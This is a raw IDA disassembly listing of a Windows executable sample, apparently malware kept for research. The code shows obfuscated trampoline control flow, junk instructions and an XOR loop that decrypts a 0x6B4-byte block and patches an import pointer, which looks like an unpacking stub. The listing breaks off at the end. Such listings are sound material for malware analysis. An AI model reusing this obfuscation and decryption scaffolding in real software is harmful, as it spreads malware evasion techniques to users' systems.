;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
; Input	MD5   :	1B6DA4BBC3D6527B14660FB0C4658804
; Input	CRC32 :	3F083F00

; File Name   :	c:\Users\farhadi\Desktop\Sample\samples\1b6da4bbc3d6527b14660fb0c4658804
; Format      :	Portable executable for	80386 (PE)
; Imagebase   :	410000
; Section 1. (virtual address 00001000)
; Virtual size			: 000017A4 (   6052.)
; Section size in file		: 00001800 (   6144.)
; Offset to raw	data for section: 00057400
; Flags	60000020: Text Executable Readable
; Alignment	: default

		include	uni.inc	; see unicode subdir of	ida for	info on	unicode

		.686p
		.mmx
		.model flat

; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 411000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_411000	proc near		; CODE XREF: sub_411188+1Fp

var_1C		= dword	ptr -1Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 3Ch
		mov	ecx, offset dword_4D2158
		and	[ebp+var_1C], ecx
		push	ecx
		mov	edi, 0
		push	edi
		call	sub_411023
		mov	eax, ds:Sleep
		jmp	eax
sub_411000	endp


; =============== S U B	R O U T	I N E =======================================


sub_411023	proc near		; CODE XREF: sub_411000+17p
		pop	ecx
		call	ecx
		pop	ecx
		push	ecx
		push	dword ptr [ecx+0D0h]
		push	ebx
		call	sub_4112A0
		add	esp, 8
		pop	ecx
		push	ecx
		push	0
		call	sub_411047
		mov	eax, ds:GlobalUnlock
		jmp	eax
sub_411023	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_411047	proc near		; CODE XREF: sub_411023+18p
		pop	ecx
		call	ecx
		pop	ecx
		add	esp, 3Ch
		pop	ebp
		retn	0
sub_411047	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 62h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4110B4	proc near		; CODE XREF: sub_411844+27p

var_14		= dword	ptr -14h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 3Ch
		lea	ecx, [eax+308h]
		adc	[ebp+var_14], esi
		push	ecx
		mov	eax, 0
		push	eax
		call	sub_4110D8
		mov	eax, ds:GlobalUnlock
		jmp	eax
sub_4110B4	endp


; =============== S U B	R O U T	I N E =======================================


sub_4110D8	proc near		; CODE XREF: sub_4110B4+18p
		pop	ecx
		call	ecx
		pop	ecx
		push	ecx
		push	edi
		push	dword ptr [ecx+180h]
		push	ebx
		push	edx
		call	sub_411DC8
		add	esp, 10h
		pop	ecx
		push	ecx
		push	0
		call	sub_4110FE
		mov	eax, ds:SetFocus
		jmp	eax
sub_4110D8	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4110FE	proc near		; CODE XREF: sub_4110D8+1Ap
		pop	ecx
		call	ecx
		pop	ecx
		add	esp, 3Ch
		pop	ebp
		retn	0
sub_4110FE	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_41110C	proc near		; CODE XREF: start+41j
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 2Ch
		lea	edi, dword_4D2170
		and	edx, edi
		push	edi
		push	dword ptr [edi+2Ch]
		push	dword ptr [edi+2A8h]
		push	esi
		push	ecx
		call	sub_411498
		add	esp, 10h
		pop	edi
		push	0
		call	sub_41113F
		mov	eax, ds:LocalFree
		jmp	eax
sub_41110C	endp


; =============== S U B	R O U T	I N E =======================================


sub_41113F	proc near		; CODE XREF: sub_41110C+27p
		pop	ecx
		call	ecx
		mov	esi, offset GetModuleHandleA
		mov	esi, [esi]
		push	esi
		push	dword ptr [edi+68h]
		pop	edx
		call	edx
		add	esp, 2Ch
		pop	ebp
		retn	0
sub_41113F	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 31h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_411188	proc near		; CODE XREF: sub_411F6A+11p

var_1C		= dword	ptr -1Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 4Ch
		lea	edi, [ebx-330h]
		xor	[ebp+var_1C], eax
		push	edi
		push	ebx
		push	dword ptr [edi+3A0h]
		push	dword ptr [edi+2FCh]
		call	sub_411000
		add	esp, 0Ch
		pop	edi
		push	0
		call	sub_4111BE
		mov	eax, ds:FindClose
		jmp	eax
sub_411188	endp


; =============== S U B	R O U T	I N E =======================================


sub_4111BE	proc near		; CODE XREF: sub_411188+2Ap
		pop	ecx
		call	ecx
		mov	ebx, 0
		push	ebx
		call	sub_4111D3
		mov	eax, ds:Sleep
		jmp	eax
sub_4111BE	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4111D3	proc near		; CODE XREF: sub_4111BE+9p
		pop	ecx
		call	ecx
		add	esp, 4Ch
		pop	ebp
		retn	0
sub_4111D3	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 0C3h	dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4112A0	proc near		; CODE XREF: sub_411023+Cp

var_44		= dword	ptr -44h
var_14		= dword	ptr -14h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 30h
		or	[ebp+var_14], ebx
		lea	eax, dword_4D228C
		push	eax
		push	6B4h
		mov	edx, 6B4h
		push	edx
		push	40001h
		mov	edi, 0B9C69DFDh
		push	dword ptr [edi+467A9213h]
		sub	[esp+44h+var_44], 2
		mov	edi, offset LoadLibraryW
		pop	dword ptr [edi]
		call	sub_4112E4
		mov	eax, ds:LoadLibraryW
		jmp	eax
sub_4112A0	endp


; =============== S U B	R O U T	I N E =======================================


sub_4112E4	proc near		; CODE XREF: sub_4112A0+38p

arg_0		= dword	ptr  4

		pop	ecx
		call	ecx
		xchg	eax, [esp-4+arg_0]
		pop	dword ptr [eax-0B4h]
		mov	edi, [eax-0B4h]
		mov	ecx, edi
		sub	edx, edx
		dec	edx
		and	edx, offset word_4120E2
		mov	edi, 1456A8DEh
		push	dword ptr [edx]
		pop	dword ptr [ecx]
		add	edx, 1
		add	ecx, 1
		xor	esi, esi

loc_411312:				; CODE XREF: sub_4112E4+50j
		xor	ebx, ebx
		push	dword ptr [edx]
		xor	[esp-4+arg_0], edi
		pop	dword ptr [ecx+ebx*2]
		sub	edi, edi
		sbb	edi, [edx+edi*4]
		neg	edi
		shr	edi, 1
		add	edx, 4
		add	ecx, 4
		add	esi, 4
		cmp	esi, 6B4h
		jnz	short loc_411312
		push	eax
		mov	edx, 0
		push	edx
		call	sub_411349
		mov	eax, ds:UnmapViewOfFile
		jmp	eax
sub_4112E4	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_411349	proc near		; CODE XREF: sub_4112E4+59p
		pop	ecx
		call	ecx
		pop	eax
		add	esp, 30h
		pop	ebp
		retn	0
sub_411349	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 60h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4113B4	proc near		; CODE XREF: sub_411DC8+23p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 2Ch
		mov	esi, offset dword_4D2000
		sbb	eax, 0FFFFFFC4h
		mov	ecx, 0
		push	ecx
		call	sub_4113D6
		mov	eax, ds:GetDC
		jmp	eax
sub_4113B4	endp


; =============== S U B	R O U T	I N E =======================================


sub_4113D6	proc near		; CODE XREF: sub_4113B4+16p
		pop	ecx
		call	ecx
		push	esi
		push	dword ptr [esi+48h]
		push	edx
		push	edx
		push	dword ptr [esi+0F0h]
		call	sub_411B24
		add	esp, 10h
		pop	esi
		push	0
		call	sub_4113FC
		mov	eax, ds:GlobalUnlock
		jmp	eax
sub_4113D6	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4113FC	proc near		; CODE XREF: sub_4113D6+1Ap
		pop	ecx
		call	ecx
		add	esp, 2Ch
		pop	ebp
		retn	0
sub_4113FC	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 92h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_411498	proc near		; CODE XREF: sub_41110C+1Cp

var_C		= dword	ptr -0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 60h
		lea	ebx, [edi-100h]
		sbb	ecx, [ebp+var_C]
		mov	eax, 0
		push	eax
		call	sub_4114BB
		mov	eax, ds:lstrlenA
		jmp	eax
sub_411498	endp


; =============== S U B	R O U T	I N E =======================================


sub_4114BB	proc near		; CODE XREF: sub_411498+17p
		pop	ecx
		call	ecx
		push	ebx
		push	dword ptr [ebx+11Ch]
		push	dword ptr [ebx+1A8h]
		call	sub_411CF0
		add	esp, 8
		pop	ebx
		push	0
		call	sub_4114E2
		mov	eax, ds:FindClose
		jmp	eax
sub_4114BB	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4114E2	proc near		; CODE XREF: sub_4114BB+1Bp
		pop	ecx
		call	ecx
		add	esp, 60h
		pop	ebp
		retn	0
sub_4114E2	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 30h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_41151C	proc near		; CODE XREF: sub_411BAC+1Fp
		mov	edi, edi
		push	ebp

loc_41151F:				; CODE XREF: sub_41151C+14j
		mov	ebp, esp
		sub	esp, 5Ch
		lea	edi, dword_4D22F8
		cmp	edi, 4A2Eh
		jbe	short loc_41151F
		push	edi
		push	dword ptr [edi+370h]
		push	eax
		push	dword ptr [edi+14Ch]
		push	ecx
		call	sub_411844
		add	esp, 10h
		pop	edi
		call	sub_411556
		mov	eax, ds:GetTickCount
		jmp	eax
sub_41151C	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_411556	proc near		; CODE XREF: sub_41151C+2Ep
		pop	ecx
		call	ecx
		call	sub_411565
		mov	eax, ds:GetTickCount
		jmp	eax
sub_411556	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_411565	proc near		; CODE XREF: sub_411556+3p
		pop	ecx
		call	ecx
		add	esp, 5Ch
		pop	ebp
		retn	0
sub_411565	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 0C1h	dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_411630	proc near		; CODE XREF: sub_411F9C+19p
		mov	edi, edi
		push	ebp

loc_411633:				; CODE XREF: sub_411630+13j
		mov	ebp, esp
		sub	esp, 44h
		mov	ecx, offset dword_4D211C
		cmp	ecx, 360Ch
		jb	short loc_411633
		push	ecx
		push	esi
		push	ebx
		push	edx
		call	sub_411A68
		add	esp, 0Ch
		pop	ecx
		push	ecx
		push	0
		call	sub_411661
		mov	eax, ds:PulseEvent
		jmp	eax
sub_411630	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_411661	proc near		; CODE XREF: sub_411630+25p
		pop	ecx
		call	ecx
		pop	ecx
		push	ecx
		mov	eax, 0
		push	eax
		call	sub_411678
		mov	eax, ds:FindClose
		jmp	eax
sub_411661	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_411678	proc near		; CODE XREF: sub_411661+Bp
		pop	ecx
		call	ecx
		pop	ecx
		add	esp, 44h
		pop	ebp
		retn	0
sub_411678	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 61h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4116E4	proc near		; CODE XREF: sub_411924+24p

var_20		= dword	ptr -20h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 60h
		lea	ebx, [esi+0A8h]
		or	edi, [ebp+var_20]
		lea	esi, [ebx-2F4h]	; CODE XREF: sub_411708+5j
		push	esi
		call	sub_411708
		mov	eax, ds:GetModuleHandleA
		jmp	eax
sub_4116E4	endp


; =============== S U B	R O U T	I N E =======================================


sub_411708	proc near		; CODE XREF: sub_4116E4+18p
		pop	ecx
		call	ecx
		test	eax, eax
		jnz	short near ptr loc_4116F5+1
		push	ebx
		push	dword ptr [ebx+138h]
		push	edi
		push	dword ptr [ebx+80h]
		call	sub_411F9C
		add	esp, 0Ch
		pop	ebx
		push	0
		call	sub_411734
		mov	eax, ds:GetDC
		jmp	eax
sub_411708	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_411734	proc near		; CODE XREF: sub_411708+20p
		pop	ecx
		call	ecx
		add	esp, 60h
		pop	ebp
		retn	0
sub_411734	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_411740	proc near		; CODE XREF: sub_411811+10p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 5Ch
		lea	esi, dword_4D20C8
		sbb	ecx, edx
		mov	edx, 0
		push	edx
		call	sub_411762
		mov	eax, ds:GlobalUnlock
		jmp	eax
sub_411740	endp


; =============== S U B	R O U T	I N E =======================================


sub_411762	proc near		; CODE XREF: sub_411740+16p
		pop	ecx
		call	ecx
		push	esi
		push	edx
		push	dword ptr [esi+1ECh]
		push	dword ptr [esi+278h]
		push	dword ptr [esi+374h]
		call	sub_411BAC
		add	esp, 10h
		pop	esi
		mov	edi, 0
		push	edi
		call	sub_411794
		mov	eax, ds:UnmapViewOfFile
		jmp	eax
sub_411762	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_411794	proc near		; CODE XREF: sub_411762+26p
		pop	ecx
		call	ecx
		add	esp, 5Ch
		pop	ebp
		retn	0
sub_411794	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


		public start
start		proc near

var_4		= dword	ptr -4

		mov	ecx, offset lstrlenA
		push	0		; lpString1
		nop

loc_4117A8:				; CODE XREF: start+4Aj
		nop
		call	dword ptr [ecx]
		nop
		call	ds:lstrcatA
		add	esp, 0FFFFFFF8h
		xor	eax, eax
		lea	eax, ds:4D2100h[eax*4]
		lea	ecx, [eax+0Ch]
		add	byte ptr [ecx],	4
		push	eax		; lpLibFileName
		call	ds:LoadLibraryW
		push	3Ch
		pop	ecx
		mov	ecx, [eax+ecx]
		sub	ecx, 0FFFFFFAFh
		mov	eax, [eax+ecx]
		shr	eax, 4
		mov	cl, 30h
		cmp	al, cl
		pusha
		jg	short loc_4117E6
		jmp	sub_41110C
; ---------------------------------------------------------------------------

loc_4117E6:				; CODE XREF: start+3Fj
		popa
		call	[esp+4+var_4]
		jbe	short loc_4117A8
start		endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4117EC	proc near		; CODE XREF: sub_4118D0+1Dp

var_1C		= dword	ptr -1Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 2Ch
		lea	edx, dword_4D21A8
		sub	esi, [ebp+var_1C]
		push	edx

loc_4117FE:				; CODE XREF: sub_411811+5j
		lea	ebx, [edx-1A8h]
		push	ebx
		call	sub_411811
		mov	eax, ds:GetModuleHandleA
		jmp	eax
sub_4117EC	endp


; =============== S U B	R O U T	I N E =======================================


sub_411811	proc near		; CODE XREF: sub_4117EC+19p
		pop	ecx
		call	ecx
		test	eax, eax
		jnz	short loc_4117FE
		pop	edx
		push	edx
		push	dword ptr [edx+0DCh]
		push	eax
		call	sub_411740
		add	esp, 8
		pop	edx
		push	edx
		push	0
		call	sub_411839
		mov	eax, ds:IsWindow
		jmp	eax
sub_411811	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_411839	proc near		; CODE XREF: sub_411811+1Cp
		pop	ecx
		call	ecx
		pop	edx
		add	esp, 2Ch
		pop	ebp
		retn	0
sub_411839	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_411844	proc near		; CODE XREF: sub_41151C+25p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 48h
		lea	eax, dword_4D2054
		or	esi, [eax+1DCh]
		push	eax
		push	dword ptr [eax+2ACh]
		push	dword ptr [eax+0D0h]
		push	dword ptr [eax+138h]
		call	sub_4110B4
		add	esp, 0Ch
		pop	eax
		push	eax
		call	sub_411881
		mov	eax, ds:GetTickCount
		jmp	eax
sub_411844	endp


; =============== S U B	R O U T	I N E =======================================


sub_411881	proc near		; CODE XREF: sub_411844+31p
		pop	ecx
		call	ecx
		pop	eax
		push	eax
		push	0
		call	sub_411894
		mov	eax, ds:CloseHandle
		jmp	eax
sub_411881	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_411894	proc near		; CODE XREF: sub_411881+7p
		pop	ecx
		call	ecx
		pop	eax
		add	esp, 48h
		pop	ebp
		retn	0
sub_411894	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 31h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4118D0	proc near		; CODE XREF: sub_411A68+25p
		mov	edi, edi
		push	ebp

loc_4118D3:				; CODE XREF: sub_4118D0+11j
		mov	ebp, esp
		sub	esp, 38h
		lea	ebx, [esi+10h]
		cmp	ebx, 4203h
		jb	short loc_4118D3
		push	ebx
		push	dword ptr [ebx+2F0h]
		push	ecx
		push	eax
		push	esi
		call	sub_4117EC
		add	esp, 10h
		pop	ebx
		mov	esi, 0
		push	esi
		call	sub_411908
		mov	eax, ds:IsWindow
		jmp	eax
sub_4118D0	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_411908	proc near		; CODE XREF: sub_4118D0+2Cp
		pop	ecx
		call	ecx
		call	sub_411917
		mov	eax, ds:GetCommandLineW
		jmp	eax
sub_411908	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_411917	proc near		; CODE XREF: sub_411908+3p
		pop	ecx
		call	ecx
		add	esp, 38h
		pop	ebp
		retn	0
sub_411917	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_411924	proc near		; CODE XREF: sub_411A14+20p

var_1C		= dword	ptr -1Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 30h
		lea	esi, dword_4D224C
		sbb	[ebp+var_1C], eax
		push	esi
		push	dword ptr [esi+100h]
		push	dword ptr [esi+320h]
		push	dword ptr [esi+338h]
		call	sub_4116E4
		add	esp, 0Ch
		pop	esi
		mov	eax, 0
		push	eax
		call	sub_411963
		mov	eax, ds:GetDC
		jmp	eax
sub_411924	endp


; =============== S U B	R O U T	I N E =======================================


sub_411963	proc near		; CODE XREF: sub_411924+33p
		pop	ecx
		call	ecx
		mov	edi, 0
		push	edi
		call	sub_411978
		mov	eax, ds:FindClose
		jmp	eax
sub_411963	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_411978	proc near		; CODE XREF: sub_411963+9p
		pop	ecx
		call	ecx
		add	esp, 30h
		pop	ebp
		retn	0
sub_411978	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 92h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_411A14	proc near		; CODE XREF: sub_411D0E+Cp
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 5Ch
		lea	eax, dword_4D234C
		sub	edi, [eax+74h]
		push	eax
		push	ecx
		push	dword ptr [eax+320h]
		push	dword ptr [eax+12Ch]
		push	edi
		call	sub_411924
		add	esp, 10h
		pop	eax
		push	eax
		push	0
		call	sub_411A4C
		mov	eax, ds:PulseEvent
		jmp	eax
sub_411A14	endp


; =============== S U B	R O U T	I N E =======================================


sub_411A4C	proc near		; CODE XREF: sub_411A14+2Cp
		pop	ecx
		call	ecx
		pop	eax
		push	eax
		call	sub_411A5D
		mov	eax, ds:GetTickCount
		jmp	eax
sub_411A4C	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_411A5D	proc near		; CODE XREF: sub_411A4C+5p
		pop	ecx
		call	ecx
		pop	eax
		add	esp, 5Ch
		pop	ebp
		retn	0
sub_411A5D	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_411A68	proc near		; CODE XREF: sub_411630+19p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 1Ch
		mov	esi, offset dword_4D2054
		or	dword ptr [esi+370h], 11F3h
		push	esi
		push	dword ptr [esi+298h]
		push	ebx
		push	dword ptr [esi+154h]
		call	sub_4118D0
		add	esp, 0Ch
		pop	esi
		mov	ecx, 0
		push	ecx
		call	sub_411AA8
		mov	eax, ds:GetDC
		jmp	eax
sub_411A68	endp


; =============== S U B	R O U T	I N E =======================================


sub_411AA8	proc near		; CODE XREF: sub_411A68+34p
		pop	ecx
		call	ecx
		push	0
		call	sub_411AB9
		mov	eax, ds:IsWindow
		jmp	eax
sub_411AA8	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_411AB9	proc near		; CODE XREF: sub_411AA8+5p
		pop	ecx
		call	ecx
		add	esp, 1Ch
		pop	ebp
		retn	0
sub_411AB9	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_411AC4	proc near		; CODE XREF: sub_411B4C+Cp

var_8		= dword	ptr -8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 34h
		lea	edx, [eax+144h]
		sbb	[ebp+var_8], 0FFFFFF93h
		push	edx

loc_411AD7:				; CODE XREF: sub_411AEA+5j
		lea	edx, [edx-1DCh]
		push	edx
		call	sub_411AEA
		mov	eax, ds:GetModuleHandleA
		jmp	eax
sub_411AC4	endp


; =============== S U B	R O U T	I N E =======================================


sub_411AEA	proc near		; CODE XREF: sub_411AC4+1Ap
		pop	ecx
		call	ecx
		test	eax, eax
		jnz	short loc_411AD7
		pop	edx
		push	edx
		push	dword ptr [edx+33Ch]
		push	dword ptr [edx+1DCh]
		call	sub_411D6C
		add	esp, 8
		pop	edx
		push	edx
		push	0
		call	sub_411B17
		mov	eax, ds:UnmapViewOfFile
		jmp	eax
sub_411AEA	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_411B17	proc near		; CODE XREF: sub_411AEA+21p
		pop	ecx
		call	ecx
		pop	edx
		add	esp, 34h
		pop	ebp
		retn	0
sub_411B17	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_411B24	proc near		; CODE XREF: sub_4113D6+Fp
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 48h
		lea	eax, [esi+98h]
		add	dword ptr [eax+0F0h], 0FFFFFFAFh
		push	eax
		mov	eax, 0
		push	eax
		call	sub_411B4C
		mov	eax, ds:IsWindow
		jmp	eax
sub_411B24	endp


; =============== S U B	R O U T	I N E =======================================


sub_411B4C	proc near		; CODE XREF: sub_411B24+1Cp
		pop	ecx
		call	ecx
		pop	eax
		push	eax
		push	dword ptr [eax+384h]
		push	ebx
		call	sub_411AC4
		add	esp, 8
		pop	eax
		push	eax
		push	0
		call	sub_411B70
		mov	eax, ds:CloseHandle
		jmp	eax
sub_411B4C	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_411B70	proc near		; CODE XREF: sub_411B4C+18p
		pop	ecx
		call	ecx
		pop	eax
		add	esp, 48h
		pop	ebp
		retn	0
sub_411B70	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 31h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_411BAC	proc near		; CODE XREF: sub_411762+17p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 3Ch
		lea	ecx, dword_4D2188
		add	dword ptr [ecx+0D0h], 79h
		push	ecx
		push	edi
		push	eax
		push	esi
		push	dword ptr [ecx+36Ch]
		call	sub_41151C
		add	esp, 10h
		pop	ecx
		push	ecx
		call	sub_411BE1
		mov	eax, ds:GetCommandLineW
		jmp	eax
sub_411BAC	endp


; =============== S U B	R O U T	I N E =======================================


sub_411BE1	proc near		; CODE XREF: sub_411BAC+29p
		pop	ecx
		call	ecx
		pop	ecx
		push	ecx
		push	0
		call	sub_411BF4
		mov	eax, ds:UnmapViewOfFile
		jmp	eax
sub_411BE1	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_411BF4	proc near		; CODE XREF: sub_411BE1+7p
		pop	ecx
		call	ecx
		pop	ecx
		add	esp, 3Ch
		pop	ebp
		retn	0
sub_411BF4	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 0F1h	dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_411CF0	proc near		; CODE XREF: sub_4114BB+10p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		lea	esi, dword_4D21FC
		sbb	ecx, edi
		push	0
		call	sub_411D0E
		mov	eax, ds:GlobalUnlock
		jmp	eax
sub_411CF0	endp


; =============== S U B	R O U T	I N E =======================================


sub_411D0E	proc near		; CODE XREF: sub_411CF0+12p
		pop	ecx
		call	ecx
		push	esi
		push	edi
		push	dword ptr [esi+114h]
		push	eax
		call	sub_411A14
		add	esp, 0Ch
		pop	esi
		push	0
		call	sub_411D31
		mov	eax, ds:PulseEvent
		jmp	eax
sub_411D0E	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_411D31	proc near		; CODE XREF: sub_411D0E+17p
		pop	ecx
		call	ecx
		add	esp, 24h
		pop	ebp
		retn	0
sub_411D31	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 31h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_411D6C	proc near		; CODE XREF: sub_411AEA+15p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 40h
		lea	eax, [edx+0E0h]
		and	ecx, [eax-0F4h]
		push	eax
		mov	ebx, 0
		push	ebx
		call	sub_411D93
		mov	eax, ds:LocalFree
		jmp	eax
sub_411D6C	endp


; =============== S U B	R O U T	I N E =======================================


sub_411D93	proc near		; CODE XREF: sub_411D6C+1Bp
		pop	ecx
		call	ecx
		pop	eax
		push	eax
		push	esi
		push	dword ptr [eax+21Ch]
		push	ecx
		call	sub_411F48
		add	esp, 0Ch
		pop	eax
		push	eax
		mov	ecx, 0
		push	ecx
		call	sub_411DBC
		mov	eax, ds:PulseEvent
		jmp	eax
sub_411D93	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_411DBC	proc near		; CODE XREF: sub_411D93+1Dp
		pop	ecx
		call	ecx
		pop	eax
		add	esp, 40h
		pop	ebp
		retn	0
sub_411DBC	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_411DC8	proc near		; CODE XREF: sub_4110D8+Ep
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 4Ch
		lea	edx, [ecx-124h]
		adc	esi, ecx
		push	edx
		push	dword ptr [edx+124h]
		push	dword ptr [edx+0Ch]
		push	dword ptr [edx+68h]
		push	dword ptr [edx+0ECh]
		call	sub_4113B4
		add	esp, 10h
		pop	edx
		push	edx
		push	0
		call	sub_411E03
		mov	eax, ds:UnmapViewOfFile
		jmp	eax
sub_411DC8	endp


; =============== S U B	R O U T	I N E =======================================


sub_411E03	proc near		; CODE XREF: sub_411DC8+2Fp
		pop	ecx
		call	ecx
		pop	edx
		push	edx
		mov	edi, 0
		push	edi
		call	sub_411E1A
		mov	eax, ds:CloseHandle
		jmp	eax
sub_411E03	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_411E1A	proc near		; CODE XREF: sub_411E03+Bp
		pop	ecx
		call	ecx
		pop	edx
		add	esp, 4Ch
		pop	ebp
		retn	0
sub_411E1A	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 123h	dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_411F48	proc near		; CODE XREF: sub_411D93+Dp
		mov	edi, edi
		push	ebp

loc_411F4B:				; CODE XREF: sub_411F48+14j
		mov	ebp, esp
		sub	esp, 4Ch
		lea	ebx, dword_4D238C
		cmp	ebx, 0E97h
		jb	short loc_411F4B
		call	sub_411F6A
		mov	eax, ds:GetTickCount
		jmp	eax
sub_411F48	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_411F6A	proc near		; CODE XREF: sub_411F48+16p
		pop	ecx
		call	ecx
		push	ebx
		push	dword ptr [ebx+144h]
		push	dword ptr [ebx+1A0h]
		push	edx
		call	sub_411188
		add	esp, 0Ch
		pop	ebx
		call	sub_411F90
		mov	eax, ds:GetTickCount
		jmp	eax
sub_411F6A	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


